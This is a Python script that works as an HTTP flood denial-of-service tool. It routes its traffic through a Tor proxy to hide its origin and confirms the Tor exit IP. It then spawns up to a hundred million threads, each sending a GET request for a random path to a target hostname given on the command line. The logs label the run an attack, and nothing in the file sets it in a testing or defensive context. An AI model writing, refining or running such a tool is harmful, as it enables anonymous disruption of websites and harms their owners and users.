import random
import socket
import string
import sys
import threading
import time
import socks
import logging

# Logging configuration
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s: %(message)s')

# Tor proxy configuration
TOR_PROXY_HOST = '127.0.0.1'
TOR_PROXY_PORTS = [9050, 9150]  # Common Tor SOCKS ports

# Configure socket to use Tor SOCKS proxy
def configure_tor_socket(port=9050):
    try:
        socks.set_default_proxy(socks.SOCKS5, TOR_PROXY_HOST, port)
        socket.socket = socks.socksocket
        logging.info(f"Tor proxy configured on port {port}")
        return port
    except Exception as e:
        logging.error(f"Tor proxy configuration failed: {e}")
        return None

# Try different Tor ports
def setup_tor_proxy():
    for port in TOR_PROXY_PORTS:
        result = configure_tor_socket(port)
        if result:
            return result
    logging.error("Could not connect to Tor proxy")
    sys.exit(1)

# Parse inputs with more robust error handling
def parse_arguments():
    if len(sys.argv) < 2:
        print(f"ERROR\n Usage: {sys.argv[0]} <Hostname> [Port] [Number_of_Requests]")
        sys.exit(1)

    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    port = 80 if len(sys.argv) < 3 else int(sys.argv[2])
    num_requests = 100000000 if len(sys.argv) < 4 else int(sys.argv[3])

    return host, port, num_requests

# Verify Tor connection
def verify_tor_connection():
    try:
        # Check IP through Tor
        import requests
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        response = requests.get('https://api.ipify.org', proxies=proxies, timeout=10)
        logging.info(f"Tor Exit Node IP: {response.text}")
        return True
    except Exception as e:
        logging.error(f"Tor connection verification failed: {e}")
        return False

# Main execution
def main():
    # Setup Tor proxy
    used_tor_port = setup_tor_proxy()

    # Verify Tor connection
    if not verify_tor_connection():
        logging.warning("Tor connection may not be fully functional")

    # Parse arguments
    host, port, num_requests = parse_arguments()

    # Resolve IP through Tor
    try:
        ip = socket.gethostbyname(host)
        logging.info(f"Resolved {host} to {ip}")
    except socket.gaierror:
        logging.error("Could not resolve hostname")
        sys.exit(2)

    # Thread-safe counter
    thread_num = 0
    thread_num_mutex = threading.Lock()

    def print_status():
        nonlocal thread_num
        with thread_num_mutex:
            thread_num += 1
            sys.stdout.write(f"\r {time.ctime().split()[3]} [{thread_num}] #-#-# Hold Your Tears #-#-#")
            sys.stdout.flush()

    def generate_url_path():
        msg = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.sample(msg, 5))

    def attack():
        print_status()
        url_path = generate_url_path()
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            dos.connect((ip, port))
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
            dos.send(byt)
        except socket.error as e:
            logging.error(f"Connection error: {e}")
        finally:
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()

    logging.info(f"Attack started on {host} ({ip}) || Port: {port} || Requests: {num_requests} || Tor Port: {used_tor_port}")

    # Spawn threads
    all_threads = []
    for _ in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)
        time.sleep(0.01)

    # Wait for all threads
    for current_thread in all_threads:
        current_thread.join()

if __name__ == '__main__':
    main()